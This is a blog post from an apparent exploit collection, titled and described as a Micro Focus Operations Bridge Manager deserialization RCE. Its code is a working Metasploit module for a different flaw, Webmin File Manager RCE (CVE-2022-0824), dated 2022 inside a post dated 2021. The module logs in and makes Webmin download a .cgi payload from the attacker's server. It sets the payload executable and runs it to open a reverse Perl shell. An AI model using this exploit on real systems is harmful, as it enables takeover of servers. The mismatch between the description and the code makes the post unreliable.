---
layout: post
title: Micro Focus Operations Bridge Manager
date: 2021-02-10 23:36 +0300
categories: [Exploits, Remote Code Execution (RCE)]
tags: [exploits]
---







![](../../../assets/img/Exploits/micro.png)

The following module in Metasploit exploits a Java deserialization vulnerability that requires authentication and affects several Micro Focus products, including Operations Bridge Manager, Application Performance Management, Data Center Automation, Universal CMDB, Hybrid Cloud Management, and Service Management Automation. Although this module was only tested on Operations Bridge Manager, exploiting this vulnerability will allow an attacker to execute code remotely as the root user on Linux or the SYSTEM user on Windows. To use the module, the attacker needs to log in to the application and obtain an authenticated LWSSO\_COOKIE\_KEY, which is required to exploit the vulnerability. Even the lowest privileged authenticated user can exploit this vulnerability.

  

```
MD5 | f6552551b0f335ef518698e89a9caa30
```

```perl
    ##
    # This module requires Metasploit: https://metasploit.com/download
    # Current source: https://github.com/rapid7/metasploit-framework
    ##
    
    class MetasploitModule < Msf::Exploit::Remote
      Rank = ExcellentRanking
    
      include Msf::Exploit::FileDropper
      include Msf::Exploit::Remote::HttpClient
      include Msf::Exploit::Remote::HttpServer
      include Msf::Exploit::Remote::HTTP::Webmin
      prepend Msf::Exploit::Remote::AutoCheck
    
      def initialize(info = {})
        super(
          update_info(
            info,
            'Name' => 'Webmin File Manager RCE',
            'Description' => %q{
              In Webmin version 1.984, any authenticated low privilege user without access rights to
              the File Manager module could interact with file manager functionalities such as downloading files from remote URLs and
              changing file permissions. It is possible to achieve Remote Code Execution via a crafted .cgi file by chaining those
              functionalities in the file manager.
            },
            'Author' => [
              'faisalfs10x', # discovery
              'jheysel-r7'   # module
            ],
            'References' => [
              [ 'URL', 'https://huntr.dev/bounties/d0049a96-de90-4b1a-9111-94de1044f295/'], # exploit
              [ 'URL', 'https://github.com/faisalfs10x/Webmin-CVE-2022-0824-revshell'], # exploit
              [ 'CVE', '2022-0824']
            ],
            'License' => MSF_LICENSE,
            'Platform' => 'linux',
            'Privileged' => true,
            'Targets' => [
              [
                'Automatic (Unix In-Memory)',
                {
                  'Platform' => 'unix',
                  'Arch' => ARCH_CMD,
                  'Type' => :unix_memory,
                  'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_perl' }
                }
              ]
            ],
            'DefaultTarget' => 0,
            'DisclosureDate' => '2022-02-26',
            'Notes' => {
              'Stability' => [CRASH_SAFE],
              'Reliability' => [REPEATABLE_SESSION],
              'SideEffects' => [IOC_IN_LOGS]
            }
          )
        )
    
        register_options(
          [
            OptPort.new('RPORT', [true, 'The default webmin port', 10000]),
            OptString.new('USERNAME', [ true, 'The username to authenticate as', '' ]),
            OptString.new('PASSWORD', [ true, 'The password for the specified username', '' ])
          ]
        )
      end
    
      def check
        webmin_check('0', '1.984')
      end
    
      def login
        webmin_login(datastore['USERNAME'], datastore['PASSWORD'])
      end
    
      def download_remote_url
        print_status('Fetching payload from HTTP server')
    
        res = send_request_cgi({
          'uri' => normalize_uri(datastore['TARGETURI'], '/extensions/file-manager/http_download.cgi'),
          'method' => 'POST',
          'keep_cookies' => true,
          'data' => 'link=' + get_uri + '.cgi' + '&username=&password=&path=%2Fusr%2Fshare%2Fwebmin',
          'headers' => {
            'Accept' => 'application/json, text/javascript, */*; q=0.01',
            'Accept-Encoding' => 'gzip, deflate',
            'Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With' => 'XMLHttpRequest',
            'Referer' => 'http://' + datastore['RHOSTS'] + ':' + datastore['RPORT'].to_s + '/filemin/?xnavigation=1'
          },
          'vars_get' => {
            'module' => 'filemin'
          }
        })
    
        fail_with(Failure::UnexpectedReply, 'Unable to download .cgi payload from http server') unless res
        fail_with(Failure::BadConfig, 'please properly configure the http server, it could not be found by webmin') if res.body.include?('Error: No valid URL supplied!')
        register_file_for_cleanup("/usr/share/webmin/#{@file_name}")
      end
    
      def modify_permissions
        print_status('Modifying the permissions of the uploaded payload to 0755')
        res = send_request_cgi({
          'uri' => normalize_uri(target_uri.path, '/extensions/file-manager/chmod.cgi'),
          'method' => 'POST',
          'keep_cookies' => true,
          'headers' => {
            'Referer' => 'http://' + datastore['RHOSTS'] + ':' + datastore['RPORT'].to_s + 'filemin/?xnavigation=1'
          },
          'vars_get' => {
            'module' => 'filemin',
            'page' => '1',
            'paginate' => '30'
          },
          'vars_post' => {
            'name' => @file_name,
            'perms' => '0755',
            'applyto' => '1',
            'path' => '/usr/share/webmin'
          }
        })
        fail_with(Failure::UnexpectedReply, 'Unable to modify permissions on the upload .cgi payload') unless res && res.code == 302
      end
    
      def exec_revshell
        res = send_request_cgi(
          'method' => 'GET',
          'keep_cookies' => true,
          'uri' => normalize_uri(datastore['TARGETURI'], @file_name),
          'headers' => {
            'Connection' => 'keep-alive'
          }
        )
    
        fail_with(Failure::UnexpectedReply, 'Unable to execute the .cgi payload') unless res && res.code == 500
      end
    
      def on_request_uri(cli, request)
        print_status("Request '#{request.method} #{request.uri}'")
        print_status('Sending payload ...')
        send_response(cli, payload.encoded,
                      'Content-Type' => 'application/octet-stream')
      end
    
      def exploit
        start_service
        @file_name = (get_resource.gsub('/', '') + '.cgi')
        cookie = login
        fail_with(Failure::BadConfig, 'Unsuccessful login attempt with creds') if cookie.empty?
        print_status('Downloading remote url')
        download_remote_url
        print_status('Finished downloading remote url')
        modify_permissions
        exec_revshell
      end
    end
```
{: .nolineno }
  
<br>

>*Source* :   [https://packetstormsecurity.com](https://packetstormsecurity.com)
